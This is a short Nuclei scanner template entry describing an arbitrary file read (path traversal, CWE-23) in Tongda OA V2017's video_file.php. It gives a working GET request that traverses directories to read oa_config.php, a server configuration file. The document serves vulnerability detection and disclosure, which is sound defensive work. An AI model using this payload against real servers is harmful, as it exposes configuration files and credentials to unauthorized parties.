# Nuclei Template: Tongda OA V2017 Video File - Arbitrary File Read
**Template ID:** tongda-video-file-read
**Vulnerability Class:** Relative Path Traversal
**Severity:** Medium
**CWE:** CWE-23
**Source:** Nuclei Template (`tongda-video-file-read.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive files on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
```

## References
- http://wiki.peiqi.tech/wiki/oa/通达OA/通达OA%20v2017%20video_file.php%20任意文件下载漏洞.html
